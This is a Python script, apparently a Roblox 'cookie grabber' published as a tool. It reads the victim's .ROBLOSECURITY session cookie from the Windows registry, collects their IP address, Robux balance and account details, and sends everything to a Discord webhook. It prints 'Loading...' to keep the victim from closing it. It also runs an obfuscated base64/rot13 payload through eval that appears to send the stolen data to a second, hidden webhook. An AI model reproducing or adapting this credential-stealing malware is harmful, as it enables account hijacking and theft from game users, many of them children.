import os
from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
import base64, codecs
import json


webhookk = "heh" # put webhook here


def command(c):
    os.system(c)
    return "l"
def cls():
    os.system("cls")

try:
    import robloxpy
    import requests
    from discordwebhook import *
except:
    command("py -m pip install discordwebhook")
    cls()
    command("py -m pip install robloxpy")
    cls()
    command("py -m pip install requests")
    cls()
    command("pip install discordwebhook")
    cls()
    command("pip install robloxpy")
    cls()
    command("pip install requests")
    cls()
    print("Run the app again.")
    exit()




dummy_message = "Loading..." # A message that distracts the user from closing the grabber
print(dummy_message)
################### Gathering INFOMATION #################################
def GrabCookie():
    # opening the roblox studio key
    robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
    # finding the subkey called ".robloxsecurity"
    try:
        count = 0
        while True:
            name, value, type = EnumValue(robloxstudiopath, count)
            if name == ".ROBLOSECURITY":
                # returns the value of .robloxsecurity
                return value
            count = count + 1
    except WindowsError:
        pass
roblox_cookie_value = str(GrabCookie())
#################### INFOMATION #################
ip_address = requests.get("https://api.ipify.org/").text
roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
#################### checking cookie #############
isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    isvalid = "Valid"
else:
    requests.post(url=webhookk,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
    exit()

#################### getting info about the cookie #############
ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
rid = info["UserID"]
rap = robloxpy.User.External.GetRAP(rid)
friends = robloxpy.User.Friends.External.GetCount(rid)
age = robloxpy.User.External.GetAge(rid)
dnso = None
crdate = robloxpy.User.External.CreationDate(rid)
rolimons = f"https://www.rolimons.com/player/{rid}"
roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']
#################### INJECT TO ROBLOX (creds to bingo methods) #################
magic = 'aW1wb3J0IHJlcXVlc3RzDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQp3ZWJmdWNraW5naG9vayA9ICJUbWxuWjJWeUlIbHZkU0IwYUc5MVoyaDBJSGx2ZFNkeVpTQm5iMjV1WVNCblpYUWdiWGtnZDJWaWFHOXZhejhLWm5WamF5QjViM1Z5SUcxdmJTQm1ZV2RuYjNRPSINCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQp3ZWJmdWNraW5naG9vay5fX2FkZF9fKCJ7ZGF0YX0iKQ0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG'
love = '9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3EipN0XVlOmqT9jQDbwVUA0o3NAPvZtp3Ei'
god = 'cA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3ANCiMgc3RvcA0KIyBzdG9wDQojIHN0b3'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
#################### SENDING TO WEBHOOK #################


discord = Discord(url=webhookk)
discord.post(
    username="BOT - Pirate 🍪",
    avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
    embeds=[
        {
            "username": "BOT - Pirate 🍪",
            "title": "💸 +1 Result Account 🕯",
            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
                {"name": "Username", "value": username, "inline": True},
                {"name": "Robux Balance", "value": robux, "inline": True},
                {"name": "Premium Status", "value": premium,"inline": True},
                {"name" : "RAP", "value": rap,"inline": True},
                {"name" : "Friends", "value": friends, "inline": True},
                {"name" : "Account Age", "value": age, "inline": True},
                {"name" : "IP Address", "value" : ip_address, "inline:": True},
                {"name" : ".ROBLOSECURITY", "value": f"```{roblox_cookie}```", "inline": False},
            ],
            "thumbnail": {"url": headshot},


        }
    ],
)
